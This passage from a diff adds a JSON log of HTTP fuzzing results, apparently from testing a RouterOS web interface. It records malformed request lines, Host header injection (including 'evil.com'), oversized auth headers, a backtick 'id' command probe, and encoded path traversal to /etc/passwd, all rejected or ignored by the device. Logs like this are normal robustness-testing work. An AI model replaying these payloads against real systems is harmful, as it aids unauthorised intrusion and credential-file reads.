+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: Keep-Alive\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:12 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:12 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae6... [truncated, total 1508 chars]",
+        "error": null,
+        "uptime_before": "2h5m54s",
+        "uptime_after": "2h5m59s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 103,
+      "category": "edge_cases",
+      "name": "Trailing space in request line",
+      "description": "Malformed request line: Trailing space in request line",
+      "result": "Response: HTTP/1.1 200 OK (1509 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:27.625926",
+      "details": {
+        "payload_size": 37,
+        "payload_preview": "GET / HTTP/1.1 \r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: Keep-Alive\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:17 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:17 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae6... [truncated, total 1508 chars]",
+        "error": null,
+        "uptime_before": "2h6m",
+        "uptime_after": "2h6m5s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 104,
+      "category": "edge_cases",
+      "name": "LF only line endings",
+      "description": "Malformed request line: LF only line endings",
+      "result": "Response: HTTP/1.1 200 OK (1509 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:33.436830",
+      "details": {
+        "payload_size": 33,
+        "payload_preview": "GET / HTTP/1.1\nHost: [REDACTED-INTERNAL-IP]\n\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: Keep-Alive\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:23 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:23 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae6... [truncated, total 1508 chars]",
+        "error": null,
+        "uptime_before": "2h6m6s",
+        "uptime_after": "2h6m11s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 105,
+      "category": "edge_cases",
+      "name": "CR only line endings",
+      "description": "Malformed request line: CR only line endings",
+      "result": "Response:  (0 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:39.243732",
+      "details": {
+        "payload_size": 33,
+        "payload_preview": "GET / HTTP/1.1\rHost: [REDACTED-INTERNAL-IP]\r\r",
+        "response_preview": "",
+        "error": null,
+        "uptime_before": "2h6m11s",
+        "uptime_after": "2h6m17s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 106,
+      "category": "edge_cases",
+      "name": "Mixed CRLF and LF",
+      "description": "Malformed request line: Mixed CRLF and LF",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:40.048134",
+      "details": {
+        "payload_size": 54,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:35 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:35 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m17s",
+        "uptime_after": "2h6m18s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 107,
+      "category": "edge_cases",
+      "name": "Empty request line",
+      "description": "Malformed request line: Empty request line",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:40.860540",
+      "details": {
+        "payload_size": 38,
+        "payload_preview": "\r\nGET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:36 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m18s",
+        "uptime_after": "2h6m18s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 108,
+      "category": "edge_cases",
+      "name": "Multiple empty lines before request",
+      "description": "Malformed request line: Multiple empty lines before request",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:41.676948",
+      "details": {
+        "payload_size": 42,
+        "payload_preview": "\r\n\r\n\r\nGET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:36 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m19s",
+        "uptime_after": "2h6m19s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 109,
+      "category": "edge_cases",
+      "name": "Tab instead of space in request",
+      "description": "Malformed request line: Tab instead of space in request",
+      "result": "Response: HTTP/1.1 200 OK (1509 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:47.507862",
+      "details": {
+        "payload_size": 36,
+        "payload_preview": "GET\t/\tHTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: Keep-Alive\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:37 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:37 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae6... [truncated, total 1508 chars]",
+        "error": null,
+        "uptime_before": "2h6m20s",
+        "uptime_after": "2h6m25s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 110,
+      "category": "edge_cases",
+      "name": "Backtick in path",
+      "description": "Malformed request line: Backtick in path",
+      "result": "Response: HTTP/1.1 404 Not Found (315 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:53.342778",
+      "details": {
+        "payload_size": 40,
+        "payload_preview": "GET /`id` HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:43 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m25s",
+        "uptime_after": "2h6m31s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 111,
+      "category": "edge_cases",
+      "name": "Empty Host",
+      "description": "Host header attack: Empty Host",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:54.155184",
+      "details": {
+        "payload_size": 44,
+        "payload_preview": "GET / HTTP/1.1\r\nHost:\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:49 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:49 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m31s",
+        "uptime_after": "2h6m32s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 112,
+      "category": "edge_cases",
+      "name": "Duplicate Host headers",
+      "description": "Host header attack: Duplicate Host headers",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:54.979596",
+      "details": {
+        "payload_size": 71,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: evil.com\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:50 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:50 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m32s",
+        "uptime_after": "2h6m32s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 113,
+      "category": "edge_cases",
+      "name": "Host with port overflow",
+      "description": "Host header attack: Host with port overflow",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:55.796004",
+      "details": {
+        "payload_size": 64,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]:99999999\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:51 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:51 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m33s",
+        "uptime_after": "2h6m33s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 114,
+      "category": "edge_cases",
+      "name": "Host with @ (userinfo)",
+      "description": "Host header attack: Host with @ (userinfo)",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:56.612412",
+      "details": {
+        "payload_size": 61,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: admin@[REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:51 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:51 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m34s",
+        "uptime_after": "2h6m34s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 115,
+      "category": "edge_cases",
+      "name": "Host with IPv6 brackets",
+      "description": "Host header attack: Host with IPv6 brackets",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:57.428820",
+      "details": {
+        "payload_size": 50,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [::1]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:52 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:52 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m35s",
+        "uptime_after": "2h6m35s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 116,
+      "category": "edge_cases",
+      "name": "Host missing",
+      "description": "Host header attack: Host missing",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:58.241226",
+      "details": {
+        "payload_size": 37,
+        "payload_preview": "GET / HTTP/1.1\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:53 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:53 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m35s",
+        "uptime_after": "2h6m36s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 117,
+      "category": "edge_cases",
+      "name": "Oversized Basic auth (8KB)",
+      "description": "Send oversized Basic Authorization header",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:59.089650",
+      "details": {
+        "payload_size": 8270,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: Basic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8270 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:54 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:54 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h6m36s",
+        "uptime_after": "2h6m37s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 118,
+      "category": "edge_cases",
+      "name": "Oversized Bearer auth (8KB)",
+      "description": "Send oversized Bearer Authorization header",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:59.898054",
+      "details": {
+        "payload_size": 8271,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: Bearer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8271 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:55 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m37s",
+        "uptime_after": "2h6m37s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 119,
+      "category": "edge_cases",
+      "name": "Oversized Digest auth (8KB)",
+      "description": "Send oversized Digest Authorization header",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:00.714462",
+      "details": {
+        "payload_size": 8282,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: Digest username=\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8282 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:56 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:56 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h6m38s",
+        "uptime_after": "2h6m38s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 120,
+      "category": "edge_cases",
+      "name": "Oversized NTLM auth (8KB)",
+      "description": "Send oversized NTLM Authorization header",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:01.518864",
+      "details": {
+        "payload_size": 8269,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: NTLM AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8269 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:56 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m39s",
+        "uptime_after": "2h6m39s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 121,
+      "category": "edge_cases",
+      "name": "Basic traversal",
+      "description": "Path traversal in URL: Basic traversal",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:02.327268",
+      "details": {
+        "payload_size": 74,
+        "payload_preview": "GET /../../../etc/passwd HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:57 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m39s",
+        "uptime_after": "2h6m40s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 122,
+      "category": "edge_cases",
+      "name": "Double-encoded traversal",
+      "description": "Path traversal in URL: Double-encoded traversal",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:03.135672",
+      "details": {
+        "payload_size": 87,
+        "payload_preview": "GET /%252e%252e/%252e%252e/etc/passwd HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:58 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m40s",
+        "uptime_after": "2h6m41s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 123,
+      "category": "edge_cases",
+      "name": "Backslash traversal",
+      "description": "Path traversal in URL: Backslash traversal",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:03.960084",
+      "details": {
+        "payload_size": 74,
+        "payload_preview": "GET /..\\..\\..\\etc\\passwd HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:59 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m41s",
+        "uptime_after": "2h6m41s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 124,
+      "category": "edge_cases",
+      "name": "URL-encoded dots",
+      "description": "Path traversal in URL: URL-encoded dots",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:04.764486",
+      "details": {
+        "payload_size": 86,
+        "payload_preview": "GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:00 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m42s",
+        "uptime_after": "2h6m42s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 125,
+      "category": "edge_cases",
+      "name": "Mixed traversal",
+      "description": "Path traversal in URL: Mixed traversal",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:05.572890",
+      "details": {
+        "payload_size": 82,
+        "payload_preview": "GET /..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:00 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m43s",
+        "uptime_after": "2h6m43s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 126,
+      "category": "edge_cases",
+      "name": "Long traversal (100 dirs)",
+      "description": "Path traversal in URL: Long traversal (100 dirs)",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:06.381294",
+      "details": {
+        "payload_size": 365,
+        "payload_preview": "GET /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.... [truncated, total 365 chars]",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:01 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m44s",
+        "uptime_after": "2h6m44s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 127,
+      "category": "edge_cases",
+      "name": "Format string in POST body: 500x %s",
+      "description": "Send format string specifiers in POST body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:07.189698",
+      "details": {
+        "payload_size": 1127,
